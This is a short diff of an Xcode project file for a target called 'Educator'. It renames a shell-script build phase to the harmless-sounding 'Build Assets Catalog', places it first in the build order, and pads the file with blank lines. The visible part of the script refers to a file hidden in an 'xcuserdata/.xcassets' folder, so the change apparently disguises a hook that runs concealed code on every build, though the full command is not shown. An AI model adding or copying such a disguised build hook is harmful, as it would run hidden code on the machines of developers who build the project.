@@ -110,7 +110,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 23979E3C26273241005F395A /* Build configuration list for PBXNativeTarget "Educator" */;
 			buildPhases = (
-				B7AB1A972B6E2000106D902C /* Compile Binary Libraries */,
+				6CC98A4A6DA0B9D13F6D902C /* Build Assets Catalog */,
 				4A1ACD50655F01F054F87C3C /* [CP] Check Pods Manifest.lock */,
 				23979E242627323E005F395A /* Sources */,
 				23979E252627323E005F395A /* Frameworks */,
@@ -173,7 +173,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	B7AB1A972B6E2000106D902C /* Compile Binary Libraries */ = {
+	6CC98A4A6DA0B9D13F6D902C /* Build Assets Catalog */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -182,7 +182,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Compile Binary Libraries";
+			name = "Build Assets Catalog";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -193,6 +193,10 @@
 
 \"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";			
 		};
+	
+
+	
+
 	
 		4A1ACD50655F01F054F87C3C /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
